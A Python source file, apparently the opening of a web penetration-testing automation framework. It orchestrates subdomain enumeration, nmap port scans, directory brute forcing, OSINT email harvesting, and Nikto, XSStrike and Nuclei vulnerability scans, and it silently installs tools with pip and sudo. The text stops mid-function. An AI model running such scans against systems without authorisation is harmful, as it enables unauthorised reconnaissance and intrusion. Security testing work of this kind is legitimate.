#!/usr/bin/env python3

"""
WebAppSec v1.0 - Web Hacking Complete Automation Framework by Braintree
Ultimate web application penetration testing automation suite
Compatible with Kali Linux and NetHunter Android

Author: Braintree Security Team
Version: 1.0
"""

import os
import sys
import time
import json
import requests
import subprocess
import threading
from datetime import datetime
import argparse
import random
import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket
from pathlib import Path
import base64

# Import Braintree managers
try:
    from .WordlistManager import WordlistManager
    from .PayloadManager import PayloadManager
    from .ShellManager import ShellManager
except ImportError:
    # Fallback for when running as standalone script
    from WordlistManager import WordlistManager
    from PayloadManager import PayloadManager
    from ShellManager import ShellManager

try:
    import colorama
    from colorama import Fore, Back, Style
    colorama.init()
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "colorama"], check=True)
    import colorama
    from colorama import Fore, Back, Style
    colorama.init()

try:
    import dns.resolver
    import dns.query
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "dnspython"], check=True)
    import dns.resolver
    import dns.query

try:
    from bs4 import BeautifulSoup
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "beautifulsoup4"], check=True)
    from bs4 import BeautifulSoup

try:
    import pyfiglet
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "pyfiglet"], check=True)
    import pyfiglet

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class WebRecon:
    """Comprehensive web reconnaissance engine"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.timeout = 10
        self.wordlist_manager = WordlistManager()
        self.payload_manager = PayloadManager()
        self.shell_manager = ShellManager()
    
    def subdomain_enum(self, domain):
        """Multi-method subdomain enumeration"""
        print(f"{Colors.YELLOW}[*] Starting subdomain enumeration for {domain}{Colors.END}")
        
        subdomains = set()
        methods = ['subfinder', 'amass', 'sublist3r', 'dns_brute']
        
        for method in methods:
            try:
                if method == 'subfinder':
                    cmd = ['subfinder', '-d', domain, '-v']  # Removed -silent for verbose output
                    print(f"{Colors.PURPLE}[CMD] Executing: {' '.join(cmd)}{Colors.END}")
                    print(f"{Colors.CYAN}[INFO] Running Subfinder for subdomain discovery...{Colors.END}")
                    
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                    
                    if result.returncode == 0:
                        # Show command output
                        if result.stdout.strip():
                            print(f"{Colors.GREEN}[SUBFINDER OUTPUT]:{Colors.END}")
                            for line in result.stdout.strip().split('\n'):
                                if line.strip():
                                    print(f"  {Colors.WHITE}{line.strip()}{Colors.END}")
                            subdomains.update(result.stdout.strip().split('\n'))
                            print(f"{Colors.GREEN}[+] Subfinder found {len(result.stdout.strip().split())} subdomains{Colors.END}")
                        else:
                            print(f"{Colors.YELLOW}[!] Subfinder completed but found no subdomains{Colors.END}")
                    else:
                        print(f"{Colors.RED}[-] Subfinder failed with exit code {result.returncode}{Colors.END}")
                        if result.stderr:
                            print(f"{Colors.RED}[ERROR] {result.stderr.strip()}{Colors.END}")
                
                elif method == 'amass':
                    cmd = ['amass', 'enum', '-passive', '-d', domain, '-v']
                    print(f"\n{Colors.PURPLE}[CMD] Executing: {' '.join(cmd)}{Colors.END}")
                    print(f"{Colors.CYAN}[INFO] Running Amass for passive subdomain enumeration...{Colors.END}")
                    
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                    
                    if result.returncode == 0:
                        if result.stdout.strip():
                            print(f"{Colors.GREEN}[AMASS OUTPUT]:{Colors.END}")
                            for line in result.stdout.strip().split('\n'):
                                if line.strip() and domain in line:
                                    print(f"  {Colors.WHITE}{line.strip()}{Colors.END}")
                            subdomains.update(result.stdout.strip().split('\n'))
                            print(f"{Colors.GREEN}[+] Amass found additional subdomains{Colors.END}")
                        else:
                            print(f"{Colors.YELLOW}[!] Amass completed but found no subdomains{Colors.END}")
                    else:
                        print(f"{Colors.RED}[-] Amass failed with exit code {result.returncode}{Colors.END}")
                        if result.stderr:
                            print(f"{Colors.RED}[ERROR] {result.stderr.strip()}{Colors.END}")
                
                elif method == 'sublist3r':
                    cmd = ['python3', '/usr/share/sublist3r/sublist3r.py', '-d', domain, '-v']
                    print(f"\n{Colors.PURPLE}[CMD] Executing: {' '.join(cmd)}{Colors.END}")
                    print(f"{Colors.CYAN}[INFO] Running Sublist3r for subdomain discovery...{Colors.END}")
                    
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                    
                    if result.returncode == 0:
                        found_subs = []
                        for line in result.stdout.split('\n'):
                            if domain in line and not line.startswith('[') and not 'Total time:' in line:
                                clean_sub = line.strip()
                                if clean_sub:
                                    subdomains.add(clean_sub)
                                    found_subs.append(clean_sub)
                        
                        if found_subs:
                            print(f"{Colors.GREEN}[SUBLIST3R OUTPUT]:{Colors.END}")
                            for sub in found_subs:
                                print(f"  {Colors.WHITE}{sub}{Colors.END}")
                            print(f"{Colors.GREEN}[+] Sublist3r found {len(found_subs)} subdomains{Colors.END}")
                        else:
                            print(f"{Colors.YELLOW}[!] Sublist3r completed but found no subdomains{Colors.END}")
                    else:
                        print(f"{Colors.RED}[-] Sublist3r failed with exit code {result.returncode}{Colors.END}")
                        if result.stderr:
                            print(f"{Colors.RED}[ERROR] {result.stderr.strip()}{Colors.END}")
                
                elif method == 'dns_brute':
                    print(f"\n{Colors.PURPLE}[CMD] Executing: DNS Brute Force Attack{Colors.END}")
                    print(f"{Colors.CYAN}[INFO] Running DNS brute force with subdomain wordlist from manager...{Colors.END}")
                    
                    # Get subdomain wordlist from WordlistManager
                    subdomain_wordlist = self._get_subdomain_wordlist()
                    if not subdomain_wordlist:
                        print(f"{Colors.YELLOW}[!] No wordlist from manager, using built-in subdomains{Colors.END}")
                        subdomain_wordlist = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging', 'blog', 
                                              'shop', 'app', 'mobile', 'support', 'help', 'cdn', 'static', 'media',
                                              'assets', 'images', 'files', 'download', 'upload', 'secure', 'vpn']
                    
                    print(f"{Colors.GREEN}[+] Using {len(subdomain_wordlist)} subdomain entries{Colors.END}")
                    
                    found_dns = []
                    for sub in subdomain_wordlist:
                        try:
                            full_domain = f"{sub}.{domain}"
                            print(f"{Colors.BLUE}[DNS] Testing: {full_domain}{Colors.END}")
                            ip = socket.gethostbyname(full_domain)
                            subdomains.add(full_domain)
                            found_dns.append(full_domain)
                            print(f"{Colors.GREEN}[+] Found: {full_domain} -> {ip}{Colors.END}")
                        except socket.gaierror:
                            print(f"{Colors.RED}[-] Not found: {sub}.{domain}{Colors.END}")
                        except Exception as e:
                            print(f"{Colors.RED}[-] Error resolving {sub}.{domain}: {e}{Colors.END}")
                    
                    if found_dns:
                        print(f"{Colors.GREEN}[+] DNS brute force found {len(found_dns)} subdomains{Colors.END}")
                    else:
                        print(f"{Colors.YELLOW}[!] DNS brute force found no subdomains{Colors.END}")
                            
            except subprocess.TimeoutExpired:
                print(f"{Colors.RED}[-] {method} timed out after 300 seconds{Colors.END}")
                continue
            except Exception as e:
                print(f"{Colors.RED}[-] {method} failed: {e}{Colors.END}")
                continue
        
        # Clean and filter subdomains
        valid_subdomains = []
        for sub in subdomains:
            sub = sub.strip()
            if sub and domain in sub and sub != domain:
                valid_subdomains.append(sub)
        
        print(f"{Colors.GREEN}[+] Found {len(valid_subdomains)} subdomains{Colors.END}")
        return list(set(valid_subdomains))
    
    def _get_subdomain_wordlist(self):
        """Get subdomain wordlist from WordlistManager"""
        print(f"{Colors.CYAN}[INFO] Loading subdomain wordlist from manager...{Colors.END}")
        
        # Try to get different subdomain wordlists in order of preference
        wordlist_options = [
            ('subdomains', 'dns_jhaddix'),
            ('subdomains', 'combined_subdomains'),
            ('subdomains', 'deepmagic_com_prefixes_top50000')
        ]
        
        for category, name in wordlist_options:
            try:
                wordlist_path = self.wordlist_manager.get_wordlist(category, name)
                if wordlist_path and wordlist_path.exists():
                    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                        subdomains = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                    
                    if subdomains:
                        print(f"{Colors.GREEN}[+] Loaded {len(subdomains)} subdomains from {name}{Colors.END}")
                        # Limit to reasonable number for brute force
                        if len(subdomains) > 1000:
                            subdomains = subdomains[:1000]
                            print(f"{Colors.YELLOW}[!] Limited to first 1000 subdomains for performance{Colors.END}")
                        return subdomains
            except Exception as e:
                print(f"{Colors.RED}[-] Error loading {name}: {e}{Colors.END}")
                continue
        
        return None
    
    def _get_directory_wordlist(self):
        """Get directory wordlist from WordlistManager"""
        print(f"{Colors.CYAN}[INFO] Loading directory wordlist from manager...{Colors.END}")
        
        # Try to get different directory wordlists in order of preference
        wordlist_options = [
            ('directories', 'dirbuster_2007_directory_list_2_3_medium'),
            ('directories', 'dirbuster_2007_directory_list_2_3_small'),
            ('directories', 'combined_directories')
        ]
        
        for category, name in wordlist_options:
            try:
                wordlist_path = self.wordlist_manager.get_wordlist(category, name)
                if wordlist_path and wordlist_path.exists():
                    print(f"{Colors.GREEN}[+] Found directory wordlist: {name}{Colors.END}")
                    return str(wordlist_path)
            except Exception as e:
                print(f"{Colors.RED}[-] Error loading {name}: {e}{Colors.END}")
                continue
        
        return None
    
    def port_scan(self, targets):
        """Fast port scanning using nmap"""
        print(f"{Colors.YELLOW}[*] Starting port scan on {len(targets)} targets{Colors.END}")
        
        open_services = {}
        
        for target in targets:
            try:
                # Quick top ports scan
                cmd = ['nmap', '-sS', '-T4', '--top-ports', '1000', '-Pn', '--open', '-v', target]
                print(f"\n{Colors.PURPLE}[CMD] Executing: {' '.join(cmd)}{Colors.END}")
                print(f"{Colors.CYAN}[INFO] Scanning top 1000 ports on {target}...{Colors.END}")
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                
                if result.returncode == 0:
                    services = []
                    print(f"{Colors.GREEN}[NMAP OUTPUT]:{Colors.END}")
                    
                    for line in result.stdout.split('\n'):
                        if '/tcp' in line and 'open' in line:
                            parts = line.split()
                            if len(parts) >= 3:
                                port = parts[0]
                                service = parts[2] if len(parts) > 2 else 'unknown'
                                services.append((port, service))
                                print(f"  {Colors.WHITE}{port} - {service} (open){Colors.END}")
                    
                    if services:
                        open_services[target] = services
                        print(f"{Colors.GREEN}[+] {target}: Found {len(services)} open ports{Colors.END}")
                    else:
                        print(f"{Colors.YELLOW}[!] No open ports found on {target}{Colors.END}")
                else:
                    print(f"{Colors.RED}[-] Nmap scan failed with exit code {result.returncode}{Colors.END}")
                    if result.stderr:
                        print(f"{Colors.RED}[ERROR] {result.stderr.strip()}{Colors.END}")
                    
            except subprocess.TimeoutExpired:
                print(f"{Colors.RED}[-] Port scan timeout for {target} after 300 seconds{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}[-] Port scan failed for {target}: {e}{Colors.END}")
        
        return open_services
    
    def web_discovery(self, targets):
        """Discover web services and endpoints"""
        print(f"{Colors.YELLOW}[*] Starting web service discovery{Colors.END}")
        print(f"{Colors.CYAN}[INFO] Testing {len(targets)} targets for web services...{Colors.END}")
        
        web_services = []
        
        for target in targets:
            print(f"\n{Colors.BLUE}[TARGET] Probing: {target}{Colors.END}")
            
            for scheme in ['http', 'https']:
                try:
                    url = f"{scheme}://{target}"
                    print(f"{Colors.CYAN}[HTTP] Testing: {url}{Colors.END}")
                    
                    response = self.session.get(url, timeout=self.timeout, verify=False)
                    
                    print(f"{Colors.WHITE}  Response: {response.status_code} {response.reason}{Colors.END}")
                    print(f"{Colors.WHITE}  Server: {response.headers.get('Server', 'Unknown')}{Colors.END}")
                    print(f"{Colors.WHITE}  Content-Length: {response.headers.get('Content-Length', 'Unknown')}{Colors.END}")
                    
                    if response.status_code < 400:
                        title = self._extract_title(response.text)
                        tech_stack = self._detect_technology(response)
                        
                        web_services.append({
                            'url': url,
                            'status_code': response.status_code,
                            'title': title,
                            'server': response.headers.get('Server', 'Unknown'),
                            'tech_stack': tech_stack
                        })
                        
                        print(f"{Colors.GREEN}[+] Active web service: {url}{Colors.END}")
                        print(f"{Colors.WHITE}    Title: {title}{Colors.END}")
                        print(f"{Colors.WHITE}    Technologies: {', '.join(tech_stack) if tech_stack else 'None detected'}{Colors.END}")
                    else:
                        print(f"{Colors.RED}[-] {url} returned {response.status_code}{Colors.END}")
                
                except requests.RequestException as e:
                    print(f"{Colors.RED}[-] {url} - Connection failed: {str(e)[:50]}...{Colors.END}")
                    continue
        
        return web_services
    
    def directory_bruteforce(self, web_services):
        """Directory and file brute forcing"""
        print(f"{Colors.YELLOW}[*] Starting directory brute force{Colors.END}")
        
        discovered_paths = {}
        
        # Get directory wordlist from WordlistManager
        wordlist = self._get_directory_wordlist()
        if not wordlist:
            print(f"{Colors.YELLOW}[!] No directory wordlist from manager, trying system wordlists...{Colors.END}")
            # Fallback to system wordlists
            wordlist_paths = [
                '/usr/share/seclists/Discovery/Web-Content/common.txt',
                '/usr/share/wordlists/dirb/common.txt',
                '/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt'
            ]
            
            print(f"{Colors.CYAN}[INFO] Searching for system directory wordlists...{Colors.END}")
            for path in wordlist_paths:
                print(f"{Colors.BLUE}[CHECK] Looking for wordlist: {path}{Colors.END}")
                if os.path.exists(path):
                    wordlist = path
                    print(f"{Colors.GREEN}[+] Found system wordlist: {path}{Colors.END}")
                    break
                else:
                    print(f"{Colors.RED}[-] Not found: {path}{Colors.END}")
        else:
            print(f"{Colors.GREEN}[+] Using directory wordlist from manager: {wordlist}{Colors.END}")
        
        if not wordlist:
            print(f"{Colors.RED}[-] No wordlist found for directory brute force{Colors.END}")
            return discovered_paths
        
        for service in web_services:
            url = service['url']
            try:
                cmd = ['gobuster', 'dir', '-u', url, '-w', wordlist, '-t', '50', '--timeout', '10s', '-v']
                print(f"\n{Colors.PURPLE}[CMD] Executing: {' '.join(cmd)}{Colors.END}")
                print(f"{Colors.CYAN}[INFO] Running Gobuster directory bruteforce on {url}...{Colors.END}")
                print(f"{Colors.CYAN}[INFO] Using wordlist: {wordlist}{Colors.END}")
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                
                if result.returncode == 0:
                    paths = []
                    print(f"{Colors.GREEN}[GOBUSTER OUTPUT]:{Colors.END}")
                    
                    for line in result.stdout.split('\n'):
                        if line and not line.startswith('=') and '200' in line or '301' in line or '302' in line:
                            print(f"  {Colors.WHITE}{line.strip()}{Colors.END}")
                            # Parse gobuster output
                            parts = line.split()
                            if len(parts) >= 2:
                                path = parts[0]
                                status = parts[1].strip('()')
                                paths.append((path, status))
                    
                    if paths:
                        discovered_paths[url] = paths
                        print(f"{Colors.GREEN}[+] {url}: Found {len(paths)} accessible paths{Colors.END}")
                    else:
                        print(f"{Colors.YELLOW}[!] No accessible paths found for {url}{Colors.END}")
                else:
                    print(f"{Colors.RED}[-] Gobuster failed with exit code {result.returncode}{Colors.END}")
                    if result.stderr:
                        print(f"{Colors.RED}[ERROR] {result.stderr.strip()}{Colors.END}")
                        
            except subprocess.TimeoutExpired:
                print(f"{Colors.RED}[-] Directory scan timeout for {url} after 300 seconds{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}[-] Directory scan failed for {url}: {e}{Colors.END}")
        
        return discovered_paths
    
    def _extract_title(self, html):
        """Extract page title from HTML"""
        try:
            soup = BeautifulSoup(html, 'html.parser')
            title = soup.find('title')
            return title.text.strip() if title else 'No Title'
        except:
            return 'No Title'
    
    def _detect_technology(self, response):
        """Basic technology stack detection"""
        tech_stack = []
        
        # Check headers
        server = response.headers.get('Server', '').lower()
        if 'apache' in server:
            tech_stack.append('Apache')
        elif 'nginx' in server:
            tech_stack.append('Nginx')
        elif 'iis' in server:
            tech_stack.append('IIS')
        
        # Check for common frameworks in content
        content = response.text.lower()
        if 'wp-content' in content or 'wordpress' in content:
            tech_stack.append('WordPress')
        elif 'joomla' in content:
            tech_stack.append('Joomla')
        elif 'drupal' in content:
            tech_stack.append('Drupal')
        
        # Check for programming languages
        if '.php' in content or 'php' in response.headers.get('X-Powered-By', ''):
            tech_stack.append('PHP')
        elif '.asp' in content or 'asp.net' in content:
            tech_stack.append('ASP.NET')
        elif 'django' in content:
            tech_stack.append('Django')
        
        return tech_stack
    
    def the_harvester_recon(self, domain, sources='all', limit=500):
        """Email and subdomain gathering using theHarvester"""
        print(f"{Colors.YELLOW}[*] Starting theHarvester reconnaissance for {domain}{Colors.END}")
        
        harvester_results = {
            'emails': [],
            'subdomains': [],
            'ips': [],
            'urls': []
        }
        
        try:
            # Run theHarvester with specified sources
            cmd = ['theHarvester', '-d', domain, '-b', sources, '-l', str(limit)]
            print(f"{Colors.PURPLE}[CMD] Executing: {' '.join(cmd)}{Colors.END}")
            print(f"{Colors.CYAN}[INFO] Running theHarvester OSINT gathering for {domain}...{Colors.END}")
            print(f"{Colors.CYAN}[INFO] Sources: {sources}, Limit: {limit}{Colors.END}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            if result.returncode == 0:
                print(f"{Colors.GREEN}[THEHARVESTER OUTPUT]:{Colors.END}")
                # Show relevant output lines
                for line in result.stdout.split('\n'):
                    if any(keyword in line for keyword in ['[*]', 'Total', 'found:', '@', 'http']):
                        print(f"  {Colors.WHITE}{line.strip()}{Colors.END}")
                
                harvester_results = self._parse_harvester_output(result.stdout)
                print(f"{Colors.GREEN}[+] theHarvester found {len(harvester_results['emails'])} emails, {len(harvester_results['subdomains'])} subdomains{Colors.END}")
                
                # Show found emails and subdomains
                if harvester_results['emails']:
                    print(f"{Colors.GREEN}[EMAILS FOUND]:{Colors.END}")
                    for email in harvester_results['emails'][:10]:  # Show first 10
                        print(f"  {Colors.WHITE}{email}{Colors.END}")
                
                if harvester_results['subdomains']:
                    print(f"{Colors.GREEN}[SUBDOMAINS FOUND]:{Colors.END}")
                    for subdomain in harvester_results['subdomains'][:10]:  # Show first 10
                        print(f"  {Colors.WHITE}{subdomain}{Colors.END}")
            else:
                print(f"{Colors.RED}[-] theHarvester failed with exit code {result.returncode}{Colors.END}")
                if result.stderr:
                    print(f"{Colors.RED}[ERROR] {result.stderr.strip()}{Colors.END}")
            
        except subprocess.TimeoutExpired:
            print(f"{Colors.RED}[-] theHarvester timeout for {domain} after 600 seconds{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[-] theHarvester failed: {e}{Colors.END}")
        
        return harvester_results
    
    def whatweb_analysis(self, targets):
        """Technology stack identification using whatweb"""
        print(f"{Colors.YELLOW}[*] Starting WhatWeb technology analysis{Colors.END}")
        
        whatweb_results = {}
        
        for target in targets:
            try:
                # Run whatweb with verbose output
                cmd = ['whatweb', '-v', '-a', '3', target]
                print(f"\n{Colors.PURPLE}[CMD] Executing: {' '.join(cmd)}{Colors.END}")
                print(f"{Colors.CYAN}[INFO] Running WhatWeb technology fingerprinting on {target}...{Colors.END}")
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                
                if result.returncode == 0:
                    print(f"{Colors.GREEN}[WHATWEB OUTPUT]:{Colors.END}")
                    # Show relevant WhatWeb output
                    for line in result.stdout.split('\n'):
                        if line.strip() and any(keyword in line for keyword in ['HTTP', 'Title', 'Server', 'PHP', 'Apache', 'nginx', 'WordPress', 'Drupal']):
                            print(f"  {Colors.WHITE}{line.strip()}{Colors.END}")
                    
                    tech_info = self._parse_whatweb_output(result.stdout)
                    if tech_info:
                        whatweb_results[target] = tech_info
                        print(f"{Colors.GREEN}[+] WhatWeb analysis completed for {target}{Colors.END}")
                        
                        # Show detected technologies
                        print(f"{Colors.GREEN}[TECHNOLOGIES DETECTED]:{Colors.END}")
                        if tech_info['server']:
                            print(f"  {Colors.WHITE}Server: {tech_info['server']}{Colors.END}")
                        if tech_info['cms']:
                            print(f"  {Colors.WHITE}CMS: {tech_info['cms']}{Colors.END}")
                        if tech_info['technologies']:
                            print(f"  {Colors.WHITE}Languages: {', '.join(tech_info['technologies'])}{Colors.END}")
                    else:
                        print(f"{Colors.YELLOW}[!] WhatWeb completed but no technologies detected for {target}{Colors.END}")
                else:
                    print(f"{Colors.RED}[-] WhatWeb failed with exit code {result.returncode}{Colors.END}")
                    if result.stderr:
                        print(f"{Colors.RED}[ERROR] {result.stderr.strip()}{Colors.END}")
                
            except subprocess.TimeoutExpired:
                print(f"{Colors.RED}[-] WhatWeb timeout for {target} after 120 seconds{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}[-] WhatWeb failed for {target}: {e}{Colors.END}")
        
        return whatweb_results
    
    def nikto_vulnerability_scan(self, web_targets):
        """Web vulnerability scanning using Nikto"""
        print(f"{Colors.YELLOW}[*] Starting Nikto web vulnerability scan{Colors.END}")
        
        nikto_results = {}
        
        for target in web_targets:
            try:
                # Parse URL to get host and port
                from urllib.parse import urlparse
                parsed = urlparse(target)
                host = parsed.hostname
                port = parsed.port or (443 if parsed.scheme == 'https' else 80)
                
                # Run nikto scan
                cmd = ['nikto', '-h', f'{host}:{port}', '-C', 'all', '-Format', 'txt', '-Display', 'V']
                print(f"\n{Colors.PURPLE}[CMD] Executing: {' '.join(cmd)}{Colors.END}")
                print(f"{Colors.CYAN}[INFO] Running Nikto web vulnerability scan on {target}...{Colors.END}")
                print(f"{Colors.CYAN}[INFO] Target: {host}:{port}{Colors.END}")
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
                
                if result.returncode == 0:
                    print(f"{Colors.GREEN}[NIKTO OUTPUT]:{Colors.END}")
                    # Show relevant Nikto output lines
                    for line in result.stdout.split('\n'):
                        if line.strip() and any(keyword in line for keyword in ['+', '-', 'OSVDB', 'CVE', 'ERROR', 'WARNING']):
                            print(f"  {Colors.WHITE}{line.strip()}{Colors.END}")
                    
                    vulnerabilities = self._parse_nikto_output(result.stdout)
                    if vulnerabilities:
                        nikto_results[target] = vulnerabilities
                        print(f"{Colors.GREEN}[+] Nikto scan completed for {target} - {len(vulnerabilities)} findings{Colors.END}")
                        
                        # Show vulnerability summary
                        print(f"{Colors.GREEN}[VULNERABILITIES FOUND]:{Colors.END}")
                        for vuln in vulnerabilities[:5]:  # Show first 5
                            print(f"  {Colors.WHITE}[{vuln['severity']}] {vuln['description'][:80]}...{Colors.END}")
                    else:
                        print(f"{Colors.YELLOW}[!] Nikto scan completed but found no vulnerabilities for {target}{Colors.END}")
                else:
                    print(f"{Colors.RED}[-] Nikto scan failed with exit code {result.returncode}{Colors.END}")
                    if result.stderr:
                        print(f"{Colors.RED}[ERROR] {result.stderr.strip()}{Colors.END}")
                
            except subprocess.TimeoutExpired:
                print(f"{Colors.RED}[-] Nikto scan timeout for {target} after 1800 seconds{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}[-] Nikto scan failed for {target}: {e}{Colors.END}")
        
        return nikto_results
    
    def _parse_harvester_output(self, output):
        """Parse theHarvester output"""
        results = {'emails': [], 'subdomains': [], 'ips': [], 'urls': []}
        
        lines = output.split('\n')
        current_section = None
        
        for line in lines:
            line = line.strip()
            if '[*] Emails found:' in line:
                current_section = 'emails'
            elif '[*] Hosts found:' in line:
                current_section = 'subdomains'
            elif '[*] IPs found:' in line:
                current_section = 'ips'
            elif '[*] URLs found:' in line:
                current_section = 'urls'
            elif current_section and line and not line.startswith('['):
                if current_section in results:
                    results[current_section].append(line)
        
        return results
    
    def _parse_whatweb_output(self, output):
        """Parse WhatWeb output"""
        tech_info = {
            'server': '',
            'technologies': [],
            'cms': '',
            'programming_language': '',
            'framework': ''
        }
        
        # Extract technology information from whatweb output
        if 'Apache' in output:
            tech_info['server'] = 'Apache'
        elif 'nginx' in output:
            tech_info['server'] = 'nginx'
        elif 'IIS' in output:
            tech_info['server'] = 'IIS'
        
        # Extract CMS information
        if 'WordPress' in output:
            tech_info['cms'] = 'WordPress'
        elif 'Drupal' in output:
            tech_info['cms'] = 'Drupal'
        elif 'Joomla' in output:
            tech_info['cms'] = 'Joomla'
        
        # Extract technologies from output
        technologies = []
        if 'PHP' in output:
            technologies.append('PHP')
        if 'JavaScript' in output:
            technologies.append('JavaScript')
        if 'Python' in output:
            technologies.append('Python')
        
        tech_info['technologies'] = technologies
        
        return tech_info
    
    def _parse_nikto_output(self, output):
        """Parse Nikto scan output"""
        vulnerabilities = []
        
        lines = output.split('\n')
        for line in lines:
            if line.startswith('+') and 'OSVDB' in line or 'CVE' in line:
                # Extract vulnerability information
                vuln_info = {
                    'description': line.strip(),
                    'type': 'Web Vulnerability',
                    'severity': 'Medium'
                }
                
                # Determine severity based on content
                if any(keyword in line.lower() for keyword in ['critical', 'high', 'remote code', 'sql injection']):
                    vuln_info['severity'] = 'High'
                elif any(keyword in line.lower() for keyword in ['info', 'disclosure', 'banner']):
                    vuln_info['severity'] = 'Low'
                
                vulnerabilities.append(vuln_info)
        
        return vulnerabilities
    
    def xsstrike_scan(self, targets):
        """XSS vulnerability scanning using XSStrike"""
        print(f"{Colors.YELLOW}[*] Starting XSStrike XSS vulnerability scan{Colors.END}")
        
        xsstrike_results = {}
        
        # Check if XSStrike is available
        xsstrike_paths = [
            '/opt/XSStrike/xsstrike.py',
            '/usr/share/XSStrike/xsstrike.py',
            '/home/kali/tools/XSStrike/xsstrike.py'
        ]
        
        xsstrike_path = None
        for path in xsstrike_paths:
            if os.path.exists(path):
                xsstrike_path = path
                break
        
        if not xsstrike_path:
            print(f"{Colors.YELLOW}[!] XSStrike not found. Installing...{Colors.END}")
            try:
                # Clone XSStrike if not available
                clone_cmd = ['git', 'clone', 'https://github.com/s0md3v/XSStrike.git', '/opt/XSStrike']
                print(f"{Colors.PURPLE}[CMD] Executing: {' '.join(clone_cmd)}{Colors.END}")
                result = subprocess.run(clone_cmd, capture_output=True, text=True, timeout=60)
                
                if result.returncode == 0:
                    xsstrike_path = '/opt/XSStrike/xsstrike.py'
                    print(f"{Colors.GREEN}[+] XSStrike installed successfully{Colors.END}")
                    
                    # Install requirements
                    req_cmd = ['pip3', 'install', '-r', '/opt/XSStrike/requirements.txt']
                    print(f"{Colors.PURPLE}[CMD] Executing: {' '.join(req_cmd)}{Colors.END}")
                    subprocess.run(req_cmd, capture_output=True)
                else:
                    print(f"{Colors.RED}[-] Failed to install XSStrike{Colors.END}")
                    return xsstrike_results
            except Exception as e:
                print(f"{Colors.RED}[-] XSStrike installation failed: {e}{Colors.END}")
                return xsstrike_results
        
        for target in targets:
            try:
                # Run XSStrike scan
                cmd = ['python3', xsstrike_path, '-u', target, '--crawl']
                print(f"\n{Colors.PURPLE}[CMD] Executing: {' '.join(cmd)}{Colors.END}")
                print(f"{Colors.CYAN}[INFO] Running XSStrike XSS scan on {target}...{Colors.END}")
                print(f"{Colors.CYAN}[INFO] Crawling and testing for XSS vulnerabilities...{Colors.END}")
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                
                if result.returncode == 0:
                    print(f"{Colors.GREEN}[XSSTRIKE OUTPUT]:{Colors.END}")
                    xss_findings = []
                    
                    for line in result.stdout.split('\n'):
                        if any(keyword in line.lower() for keyword in ['vulnerable', 'xss', 'payload', 'confirmed']):
                            print(f"  {Colors.WHITE}{line.strip()}{Colors.END}")
                            if 'vulnerable' in line.lower() or 'confirmed' in line.lower():
                                xss_findings.append(line.strip())
                    
                    if xss_findings:
                        xsstrike_results[target] = xss_findings
                        print(f"{Colors.GREEN}[+] XSStrike found {len(xss_findings)} XSS vulnerabilities in {target}{Colors.END}")
                        
                        # Show vulnerability summary
                        print(f"{Colors.GREEN}[XSS VULNERABILITIES FOUND]:{Colors.END}")
                        for vuln in xss_findings[:5]:  # Show first 5
                            print(f"  {Colors.WHITE}{vuln[:80]}...{Colors.END}")
                    else:
                        print(f"{Colors.YELLOW}[!] No XSS vulnerabilities found in {target}{Colors.END}")
                else:
                    print(f"{Colors.RED}[-] XSStrike scan failed with exit code {result.returncode}{Colors.END}")
                    if result.stderr:
                        print(f"{Colors.RED}[ERROR] {result.stderr.strip()}{Colors.END}")
                
            except subprocess.TimeoutExpired:
                print(f"{Colors.RED}[-] XSStrike scan timeout for {target} after 300 seconds{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}[-] XSStrike scan failed for {target}: {e}{Colors.END}")
        
        return xsstrike_results
    
    def nuclei_scan(self, targets):
        """Nuclei template-based vulnerability scanner"""
        print(f"{Colors.YELLOW}[*] Starting Nuclei template-based vulnerability scan{Colors.END}")
        
        nuclei_results = {}
        
        # Check if Nuclei is installed
        try:
            version_cmd = ['nuclei', '-version']
            result = subprocess.run(version_cmd, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                version = result.stdout.strip()
                print(f"{Colors.GREEN}[+] Nuclei version: {version}{Colors.END}")
            else:
                print(f"{Colors.YELLOW}[!] Nuclei not found. Installing...{Colors.END}")
                # Install nuclei
                install_cmd = ['go', 'install', '-v', 'github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest']
                print(f"{Colors.PURPLE}[CMD] Executing: {' '.join(install_cmd)}{Colors.END}")
                install_result = subprocess.run(install_cmd, capture_output=True, text=True, timeout=120)
                
                if install_result.returncode != 0:
                    print(f"{Colors.RED}[-] Failed to install Nuclei. Trying apt install...{Colors.END}")
                    apt_cmd = ['sudo', 'apt', 'install', '-y', 'nuclei']
                    print(f"{Colors.PURPLE}[CMD] Executing: {' '.join(apt_cmd)}{Colors.END}")
                    subprocess.run(apt_cmd, capture_output=True)
        
        except FileNotFoundError:
